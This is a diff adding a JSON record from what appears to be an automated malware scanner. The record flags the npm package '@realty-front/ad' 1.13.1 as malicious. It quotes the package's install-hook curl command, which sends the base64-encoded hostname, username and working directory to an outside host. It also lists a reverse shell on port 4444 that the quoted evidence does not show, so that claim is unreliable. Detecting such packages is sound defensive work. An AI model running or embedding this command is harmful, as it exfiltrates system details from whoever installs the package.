@@ -1,0 +1,54 @@
+{
+  "package_name": "@realty-front/ad",
+  "version": "1.13.1",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that may execute remote code at install time.",
+        "details": "The install hook command listed in the package metadata above executes a curl command with a payload that may indicate a remote code execution attempt.",
+        "confidence": 0.92,
+        "evidence_commands": [
+          "curl -H \"Package:@realty-front/ad\" -H \"Version:1.13.1\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package '@realty-front/ad' version 1.13.1 contains an install hook that may execute remote code at install time. The install hook executes a curl command with a payload that may indicate a remote code execution attempt.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash -c",
+        "34.x.x.x:4444",
+        "reverseshell"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.92
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not contain a description or README file."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:03:52.075592"
+}
